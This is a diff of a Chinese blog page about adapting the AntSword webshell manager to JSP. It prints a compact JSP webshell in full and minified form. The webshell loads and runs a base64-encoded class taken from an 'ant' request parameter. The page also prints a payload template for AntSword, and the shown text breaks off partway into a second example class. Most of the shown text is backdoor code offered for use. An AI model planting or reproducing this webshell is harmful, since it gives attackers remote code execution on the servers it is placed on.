@@ -10,13 +10,12 @@
     <title>蚁剑改造计划之实现JSP一句话 - </title><meta name="Description" content="yzddMr6&#39;s Blog"><meta property="og:title" content="蚁剑改造计划之实现JSP一句话" />
 <meta property="og:description" content="1 前言本人有意写一份系列文章，主要内容是分享蚁剑改造过程中的一些技巧与经验。 因为蚁剑的相关文档实在比较少，可能很多同学都像自己当初一样想要二" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://yzddmr6.com/posts/antsword-diy-3/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp"/><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://yzddmr6.com/posts/antsword-diy-3/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2020-03-28T13:24:58+00:00" />
 <meta property="article:modified_time" content="2020-03-28T13:24:58+00:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
-<meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp"/>
 
-<meta name="twitter:title" content="蚁剑改造计划之实现JSP一句话"/>
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp" /><meta name="twitter:title" content="蚁剑改造计划之实现JSP一句话"/>
 <meta name="twitter:description" content="1 前言本人有意写一份系列文章，主要内容是分享蚁剑改造过程中的一些技巧与经验。 因为蚁剑的相关文档实在比较少，可能很多同学都像自己当初一样想要二"/>
 <meta name="application-name" content="yzddMr6&#39;s Blog">
 <meta name="apple-mobile-web-app-title" content="yzddMr6&#39;s Blog">
@@ -344,24 +343,24 @@
 </span><span class="lnt">18
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@ page import=&#34;sun.misc.BASE64Decoder&#34; %&gt;
-</span></span><span class="line"><span class="cl">&lt;%!
-</span></span><span class="line"><span class="cl">    class U extends ClassLoader{
-</span></span><span class="line"><span class="cl">        U(ClassLoader c){
-</span></span><span class="line"><span class="cl">            super(c);
-</span></span><span class="line"><span class="cl">        }
-</span></span><span class="line"><span class="cl">        public Class g(byte []b){
-</span></span><span class="line"><span class="cl">            return super.defineClass(b,0,b.length);
-</span></span><span class="line"><span class="cl">        }
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">    BASE64Decoder decoder=new sun.misc.BASE64Decoder();
-</span></span><span class="line"><span class="cl">%&gt;
-</span></span><span class="line"><span class="cl">&lt;%
-</span></span><span class="line"><span class="cl">    String cls=request.getParameter(&#34;ant&#34;);
-</span></span><span class="line"><span class="cl">    if(cls!=null){
-</span></span><span class="line"><span class="cl">    new U(this.getClass().getClassLoader()).g(decoder.decodeBuffer(cls)).newInstance().equals(pageContext);
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">%&gt;
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s2">&#34;sun.misc.BASE64Decoder&#34;</span> <span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%!</span>
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="n">U</span> <span class="k">extends</span> <span class="n">ClassLoader</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">U</span><span class="p">(</span><span class="n">ClassLoader</span> <span class="n">c</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="n">super</span><span class="p">(</span><span class="n">c</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">public</span> <span class="n">Class</span> <span class="n">g</span><span class="p">(</span><span class="n">byte</span> <span class="p">[]</span><span class="n">b</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">super</span><span class="o">.</span><span class="n">defineClass</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">b</span><span class="o">.</span><span class="n">length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">BASE64Decoder</span> <span class="n">decoder</span><span class="o">=</span><span class="n">new</span> <span class="n">sun</span><span class="o">.</span><span class="n">misc</span><span class="o">.</span><span class="n">BASE64Decoder</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span>
+</span></span><span class="line"><span class="cl">    <span class="ne">String</span> <span class="n">cls</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">getParameter</span><span class="p">(</span><span class="s2">&#34;ant&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">cls</span><span class="o">!=</span><span class="n">null</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="n">new</span> <span class="n">U</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getClassLoader</span><span class="p">())</span><span class="o">.</span><span class="n">g</span><span class="p">(</span><span class="n">decoder</span><span class="o">.</span><span class="n">decodeBuffer</span><span class="p">(</span><span class="n">cls</span><span class="p">))</span><span class="o">.</span><span class="n">newInstance</span><span class="p">()</span><span class="o">.</span><span class="n">equals</span><span class="p">(</span><span class="n">pageContext</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>压缩一下后只有316个字节，由于去掉了解密功能，所以比冰蝎还小。</p>
@@ -370,7 +369,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%!class U extends ClassLoader{ U(ClassLoader c){ super(c); }public Class g(byte []b){ return super.defineClass(b,0,b.length); }}%&gt;&lt;% String cls=request.getParameter(&#34;ant&#34;);if(cls!=null){ new U(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(cls)).newInstance().equals(pageContext); }%&gt;
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;%!</span><span class="k">class</span> <span class="n">U</span> <span class="k">extends</span> <span class="n">ClassLoader</span><span class="p">{</span> <span class="n">U</span><span class="p">(</span><span class="n">ClassLoader</span> <span class="n">c</span><span class="p">){</span> <span class="n">super</span><span class="p">(</span><span class="n">c</span><span class="p">);</span> <span class="p">}</span><span class="n">public</span> <span class="n">Class</span> <span class="n">g</span><span class="p">(</span><span class="n">byte</span> <span class="p">[]</span><span class="n">b</span><span class="p">){</span> <span class="k">return</span> <span class="n">super</span><span class="o">.</span><span class="n">defineClass</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">b</span><span class="o">.</span><span class="n">length</span><span class="p">);</span> <span class="p">}}</span><span class="o">%&gt;&lt;%</span> <span class="ne">String</span> <span class="n">cls</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">getParameter</span><span class="p">(</span><span class="s2">&#34;ant&#34;</span><span class="p">);</span><span class="k">if</span><span class="p">(</span><span class="n">cls</span><span class="o">!=</span><span class="n">null</span><span class="p">){</span> <span class="n">new</span> <span class="n">U</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getClassLoader</span><span class="p">())</span><span class="o">.</span><span class="n">g</span><span class="p">(</span><span class="n">new</span> <span class="n">sun</span><span class="o">.</span><span class="n">misc</span><span class="o">.</span><span class="n">BASE64Decoder</span><span class="p">()</span><span class="o">.</span><span class="n">decodeBuffer</span><span class="p">(</span><span class="n">cls</span><span class="p">))</span><span class="o">.</span><span class="n">newInstance</span><span class="p">()</span><span class="o">.</span><span class="n">equals</span><span class="p">(</span><span class="n">pageContext</span><span class="p">);</span> <span class="p">}</span><span class="o">%&gt;</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>Payload模板</p>
@@ -444,70 +443,70 @@
 </span><span class="lnt">64
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import javax.servlet.ServletRequest;
-</span></span><span class="line"><span class="cl">import javax.servlet.ServletResponse;
-</span></span><span class="line"><span class="cl">import javax.servlet.jsp.PageContext;
-</span></span><span class="line"><span class="cl">import java.io.ByteArrayOutputStream;
-</span></span><span class="line"><span class="cl">public class Demo {
-</span></span><span class="line"><span class="cl">    public String encoder;
-</span></span><span class="line"><span class="cl">    public String cs;
-</span></span><span class="line"><span class="cl">    @Override
-</span></span><span class="line"><span class="cl">    public boolean equals(Object obj) {
-</span></span><span class="line"><span class="cl">        PageContext page = (PageContext)obj;
-</span></span><span class="line"><span class="cl">        ServletRequest request = page.getRequest();
-</span></span><span class="line"><span class="cl">        ServletResponse response = page.getResponse();
-</span></span><span class="line"><span class="cl">        encoder = request.getParameter(&#34;encoder&#34;)!=null?request.getParameter(&#34;encoder&#34;):&#34;&#34;;
-</span></span><span class="line"><span class="cl">        cs=request.getParameter(&#34;charset&#34;)!=null?request.getParameter(&#34;charset&#34;):&#34;UTF-8&#34;;
-</span></span><span class="line"><span class="cl">        StringBuffer output = new StringBuffer(&#34;&#34;);
-</span></span><span class="line"><span class="cl">        StringBuffer sb = new StringBuffer(&#34;&#34;);
-</span></span><span class="line"><span class="cl">        try {
-</span></span><span class="line"><span class="cl">            response.setContentType(&#34;text/html&#34;);
-</span></span><span class="line"><span class="cl">            request.setCharacterEncoding(cs);
-</span></span><span class="line"><span class="cl">            response.setCharacterEncoding(cs);
-</span></span><span class="line"><span class="cl">            String var0 = EC(decode(request.getParameter(&#34;var0&#34;)+&#34;&#34;));
-</span></span><span class="line"><span class="cl">            String var1 = EC(decode(request.getParameter(&#34;var1&#34;)+&#34;&#34;));
-</span></span><span class="line"><span class="cl">            String var2 = EC(decode(request.getParameter(&#34;var2&#34;)+&#34;&#34;));
-</span></span><span class="line"><span class="cl">            String var3 = EC(decode(request.getParameter(&#34;var3&#34;)+&#34;&#34;));
-</span></span><span class="line"><span class="cl">            output.append(&#34;-&gt;&#34; + &#34;|&#34;);
-</span></span><span class="line"><span class="cl">            sb.append(func(var1));
-</span></span><span class="line"><span class="cl">            output.append(sb.toString());
-</span></span><span class="line"><span class="cl">            output.append(&#34;|&#34; + &#34;&lt;-&#34;);
-</span></span><span class="line"><span class="cl">            page.getOut().print(output.toString());
-</span></span><span class="line"><span class="cl">        } catch (Exception e) {
-</span></span><span class="line"><span class="cl">            sb.append(&#34;ERROR&#34; + &#34;:// &#34; + e.toString());
-</span></span><span class="line"><span class="cl">        }
-</span></span><span class="line"><span class="cl">        return true;
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">    String EC(String s) throws Exception {
-</span></span><span class="line"><span class="cl">        if(encoder.equals(&#34;hex&#34;)) return s;
-</span></span><span class="line"><span class="cl">        return new String(s.getBytes(), cs);
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">    String decode(String str) throws Exception{
-</span></span><span class="line"><span class="cl">        if(encoder.equals(&#34;hex&#34;)){
-</span></span><span class="line"><span class="cl">            if(str==&#34;null&#34;||str.equals(&#34;null&#34;)){
-</span></span><span class="line"><span class="cl">                return &#34;&#34;;
-</span></span><span class="line"><span class="cl">            }
-</span></span><span class="line"><span class="cl">            String hexString = &#34;0123456789ABCDEF&#34;;
-</span></span><span class="line"><span class="cl">            str = str.toUpperCase();
-</span></span><span class="line"><span class="cl">            ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length()/2);
-</span></span><span class="line"><span class="cl">            String ss = &#34;&#34;;
-</span></span><span class="line"><span class="cl">            for (int i = 0; i &lt; str.length(); i += 2){
-</span></span><span class="line"><span class="cl">                ss = ss + (hexString.indexOf(str.charAt(i)) &lt;&lt; 4 | hexString.indexOf(str.charAt(i + 1))) + &#34;,&#34;;
-</span></span><span class="line"><span class="cl">                baos.write((hexString.indexOf(str.charAt(i)) &lt;&lt; 4 | hexString.indexOf(str.charAt(i + 1))));
-</span></span><span class="line"><span class="cl">            }
-</span></span><span class="line"><span class="cl">            return baos.toString(&#34;UTF-8&#34;);
-</span></span><span class="line"><span class="cl">        }else if(encoder.equals(&#34;base64&#34;)){
-</span></span><span class="line"><span class="cl">            byte[] bt = null;
-</span></span><span class="line"><span class="cl">            sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();
-</span></span><span class="line"><span class="cl">            bt = decoder.decodeBuffer(str);
-</span></span><span class="line"><span class="cl">            return new String(bt,&#34;UTF-8&#34;);
-</span></span><span class="line"><span class="cl">        }
-</span></span><span class="line"><span class="cl">        return str;
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">    String func (String var1){
-</span></span><span class="line"><span class="cl">    // Your code
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">}
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">javax</span><span class="o">.</span><span class="n">servlet</span><span class="o">.</span><span class="n">ServletRequest</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">javax</span><span class="o">.</span><span class="n">servlet</span><span class="o">.</span><span class="n">ServletResponse</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">javax</span><span class="o">.</span><span class="n">servlet</span><span class="o">.</span><span class="n">jsp</span><span class="o">.</span><span class="n">PageContext</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">java</span><span class="o">.</span><span class="n">io</span><span class="o">.</span><span class="n">ByteArrayOutputStream</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">public</span> <span class="k">class</span> <span class="n">Demo</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="ne">String</span> <span class="n">encoder</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="ne">String</span> <span class="n">cs</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">@</span><span class="n">Override</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">boolean</span> <span class="n">equals</span><span class="p">(</span><span class="ne">Object</span> <span class="n">obj</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">PageContext</span> <span class="n">page</span> <span class="o">=</span> <span class="p">(</span><span class="n">PageContext</span><span class="p">)</span><span class="n">obj</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ServletRequest</span> <span class="n">request</span> <span class="o">=</span> <span class="n">page</span><span class="o">.</span><span class="n">getRequest</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ServletResponse</span> <span class="n">response</span> <span class="o">=</span> <span class="n">page</span><span class="o">.</span><span class="n">getResponse</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">encoder</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">getParameter</span><span class="p">(</span><span class="s2">&#34;encoder&#34;</span><span class="p">)</span><span class="o">!=</span><span class="n">null</span><span class="err">?</span><span class="n">request</span><span class="o">.</span><span class="n">getParameter</span><span class="p">(</span><span class="s2">&#34;encoder&#34;</span><span class="p">):</span><span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cs</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">getParameter</span><span class="p">(</span><span class="s2">&#34;charset&#34;</span><span class="p">)</span><span class="o">!=</span><span class="n">null</span><span class="err">?</span><span class="n">request</span><span class="o">.</span><span class="n">getParameter</span><span class="p">(</span><span class="s2">&#34;charset&#34;</span><span class="p">):</span><span class="s2">&#34;UTF-8&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">StringBuffer</span> <span class="n">output</span> <span class="o">=</span> <span class="n">new</span> <span class="n">StringBuffer</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">StringBuffer</span> <span class="n">sb</span> <span class="o">=</span> <span class="n">new</span> <span class="n">StringBuffer</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">response</span><span class="o">.</span><span class="n">setContentType</span><span class="p">(</span><span class="s2">&#34;text/html&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">request</span><span class="o">.</span><span class="n">setCharacterEncoding</span><span class="p">(</span><span class="n">cs</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">response</span><span class="o">.</span><span class="n">setCharacterEncoding</span><span class="p">(</span><span class="n">cs</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="ne">String</span> <span class="n">var0</span> <span class="o">=</span> <span class="n">EC</span><span class="p">(</span><span class="n">decode</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">getParameter</span><span class="p">(</span><span class="s2">&#34;var0&#34;</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="ne">String</span> <span class="n">var1</span> <span class="o">=</span> <span class="n">EC</span><span class="p">(</span><span class="n">decode</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">getParameter</span><span class="p">(</span><span class="s2">&#34;var1&#34;</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="ne">String</span> <span class="n">var2</span> <span class="o">=</span> <span class="n">EC</span><span class="p">(</span><span class="n">decode</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">getParameter</span><span class="p">(</span><span class="s2">&#34;var2&#34;</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="ne">String</span> <span class="n">var3</span> <span class="o">=</span> <span class="n">EC</span><span class="p">(</span><span class="n">decode</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">getParameter</span><span class="p">(</span><span class="s2">&#34;var3&#34;</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="n">output</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&#34;-&gt;&#34;</span> <span class="o">+</span> <span class="s2">&#34;|&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">sb</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="k">func</span><span class="p">(</span><span class="n">var1</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="n">output</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">sb</span><span class="o">.</span><span class="n">toString</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">            <span class="n">output</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&#34;|&#34;</span> <span class="o">+</span> <span class="s2">&#34;&lt;-&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">page</span><span class="o">.</span><span class="n">getOut</span><span class="p">()</span><span class="o">.</span><span class="n">print</span><span class="p">(</span><span class="n">output</span><span class="o">.</span><span class="n">toString</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">sb</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&#34;ERROR&#34;</span> <span class="o">+</span> <span class="s2">&#34;:// &#34;</span> <span class="o">+</span> <span class="n">e</span><span class="o">.</span><span class="n">toString</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="bp">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="ne">String</span> <span class="n">EC</span><span class="p">(</span><span class="ne">String</span> <span class="n">s</span><span class="p">)</span> <span class="n">throws</span> <span class="n">Exception</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">encoder</span><span class="o">.</span><span class="n">equals</span><span class="p">(</span><span class="s2">&#34;hex&#34;</span><span class="p">))</span> <span class="k">return</span> <span class="n">s</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">new</span> <span class="ne">String</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">getBytes</span><span class="p">(),</span> <span class="n">cs</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="ne">String</span> <span class="n">decode</span><span class="p">(</span><span class="ne">String</span> <span class="nb">str</span><span class="p">)</span> <span class="n">throws</span> <span class="n">Exception</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">encoder</span><span class="o">.</span><span class="n">equals</span><span class="p">(</span><span class="s2">&#34;hex&#34;</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nb">str</span><span class="o">==</span><span class="s2">&#34;null&#34;</span><span class="o">||</span><span class="nb">str</span><span class="o">.</span><span class="n">equals</span><span class="p">(</span><span class="s2">&#34;null&#34;</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="ne">String</span> <span class="n">hexString</span> <span class="o">=</span> <span class="s2">&#34;0123456789ABCDEF&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">str</span> <span class="o">=</span> <span class="nb">str</span><span class="o">.</span><span class="n">toUpperCase</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ByteArrayOutputStream</span> <span class="n">baos</span> <span class="o">=</span> <span class="n">new</span> <span class="n">ByteArrayOutputStream</span><span class="p">(</span><span class="nb">str</span><span class="o">.</span><span class="n">length</span><span class="p">()</span><span class="o">/</span><span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="ne">String</span> <span class="n">ss</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="p">(</span><span class="ne">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">str</span><span class="o">.</span><span class="n">length</span><span class="p">();</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">                <span class="n">ss</span> <span class="o">=</span> <span class="n">ss</span> <span class="o">+</span> <span class="p">(</span><span class="n">hexString</span><span class="o">.</span><span class="n">indexOf</span><span class="p">(</span><span class="nb">str</span><span class="o">.</span><span class="n">charAt</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span> <span class="o">|</span> <span class="n">hexString</span><span class="o">.</span><span class="n">indexOf</span><span class="p">(</span><span class="nb">str</span><span class="o">.</span><span class="n">charAt</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)))</span> <span class="o">+</span> <span class="s2">&#34;,&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">baos</span><span class="o">.</span><span class="n">write</span><span class="p">((</span><span class="n">hexString</span><span class="o">.</span><span class="n">indexOf</span><span class="p">(</span><span class="nb">str</span><span class="o">.</span><span class="n">charAt</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span> <span class="o">|</span> <span class="n">hexString</span><span class="o">.</span><span class="n">indexOf</span><span class="p">(</span><span class="nb">str</span><span class="o">.</span><span class="n">charAt</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))));</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">baos</span><span class="o">.</span><span class="n">toString</span><span class="p">(</span><span class="s2">&#34;UTF-8&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">encoder</span><span class="o">.</span><span class="n">equals</span><span class="p">(</span><span class="s2">&#34;base64&#34;</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">            <span class="n">byte</span><span class="p">[]</span> <span class="n">bt</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">sun</span><span class="o">.</span><span class="n">misc</span><span class="o">.</span><span class="n">BASE64Decoder</span> <span class="n">decoder</span> <span class="o">=</span> <span class="n">new</span> <span class="n">sun</span><span class="o">.</span><span class="n">misc</span><span class="o">.</span><span class="n">BASE64Decoder</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="n">bt</span> <span class="o">=</span> <span class="n">decoder</span><span class="o">.</span><span class="n">decodeBuffer</span><span class="p">(</span><span class="nb">str</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">new</span> <span class="ne">String</span><span class="p">(</span><span class="n">bt</span><span class="p">,</span><span class="s2">&#34;UTF-8&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">str</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="ne">String</span> <span class="k">func</span> <span class="p">(</span><span class="ne">String</span> <span class="n">var1</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="o">//</span> <span class="n">Your</span> <span class="n">code</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>举个栗子，写一个返回hello+名字的函数</p>
@@ -576,67 +575,67 @@
 </span><span class="lnt">61
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import javax.servlet.ServletRequest;
-</span></span><span class="line"><span class="cl">import javax.servlet.ServletResponse;
-</span></span><span class="line"><span class="cl">import javax.servlet.jsp.PageContext;
-</span></span><span class="line"><span class="cl">import java.io.ByteArrayOutputStream;
-</span></span><span class="line"><span class="cl">public class Test {
-</span></span><span class="line"><span class="cl">    public String encoder;
-</span></span><span class="line"><span class="cl">    public String cs;
-</span></span><span class="line"><span class="cl">    @Override
-</span></span><span class="line"><span class="cl">    public boolean equals(Object obj) {
-</span></span><span class="line"><span class="cl">        PageContext page = (PageContext)obj;
-</span></span><span class="line"><span class="cl">        ServletRequest request = page.getRequest();
-</span></span><span class="line"><span class="cl">        ServletResponse response = page.getResponse();
-</span></span><span class="line"><span class="cl">        encoder = request.getParameter(&#34;encoder&#34;)!=null?request.getParameter(&#34;encoder&#34;):&#34;&#34;;
-</span></span><span class="line"><span class="cl">        cs=request.getParameter(&#34;charset&#34;)!=null?request.getParameter(&#34;charset&#34;):&#34;UTF-8&#34;;
-</span></span><span class="line"><span class="cl">        StringBuffer output = new StringBuffer(&#34;&#34;);
-</span></span><span class="line"><span class="cl">        StringBuffer sb = new StringBuffer(&#34;&#34;);
-</span></span><span class="line"><span class="cl">        try {
-</span></span><span class="line"><span class="cl">            response.setContentType(&#34;text/html&#34;);
-</span></span><span class="line"><span class="cl">            request.setCharacterEncoding(cs);
-</span></span><span class="line"><span class="cl">            response.setCharacterEncoding(cs);
-</span></span><span class="line"><span class="cl">            String var0 = EC(decode(request.getParameter(&#34;var0&#34;)+&#34;&#34;));
-</span></span><span class="line"><span class="cl">            output.append(&#34;-&gt;&#34; + &#34;|&#34;);
-</span></span><span class="line"><span class="cl">            sb.append(test(var0));
-</span></span><span class="line"><span class="cl">            output.append(sb.toString());
-</span></span><span class="line"><span class="cl">            output.append(&#34;|&#34; + &#34;&lt;-&#34;);
-</span></span><span class="line"><span class="cl">            page.getOut().print(output.toString());
-</span></span><span class="line"><span class="cl">        } catch (Exception e) {
-</span></span><span class="line"><span class="cl">            sb.append(&#34;ERROR&#34; + &#34;:// &#34; + e.toString());
-</span></span><span class="line"><span class="cl">        }
-</span></span><span class="line"><span class="cl">        return true;
-</span></span><span class="line"><span class="cl">    }
